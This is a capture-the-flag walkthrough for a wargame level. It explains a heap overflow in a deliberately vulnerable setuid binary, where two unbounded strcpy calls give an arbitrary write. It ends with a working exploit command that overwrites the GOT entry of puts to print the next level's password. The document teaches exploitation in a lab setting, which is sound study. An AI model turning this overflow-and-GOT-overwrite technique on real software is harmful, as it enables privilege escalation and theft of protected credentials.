# Level7 Walkthrough

Binary is setuid `level8`.

```c
char c[68];

void m(void) {
  printf("%s - %d\n", c, time(NULL));
}

int main(int argc, char **argv) {
  account *a = malloc(8);  a->id = 1;  a->name = malloc(8);
  account *b = malloc(8);  b->id = 2;  b->name = malloc(8);

  strcpy(a->name, argv[1]);
  strcpy(b->name, argv[2]);

  FILE *f = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, f);
  puts("~~");
}
```

## Vulnerability

Both `strcpy` are unbounded. On the heap the blocks are laid out
`a` -> `a->name` -> `b` -> `b->name`. Overflowing `a->name` (first strcpy) with
`argv[1]` overwrites the `b->name` pointer. The second `strcpy(b->name, argv[2])`
then writes `argv[2]` to the address now held in `b->name`: arbitrary write
(`argv[1]` chooses where, `argv[2]` chooses what).

`m` prints the global `c`, which `fgets` already filled with the level8 pass, but
`m` is never called.

## Exploitation

Arbitrary write into the GOT entry of `puts`, pointing it to `m`. When `main` calls
`puts("~~")`, `m` runs and prints the pass.

- Offset to `b->name`: 20 bytes.
- GOT entry of `puts`: `0x08049928` -> `\x28\x99\x04\x08` (where).
- Address of `m`: `0x080484f4` -> `\xf4\x84\x04\x08` (what).

```sh
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

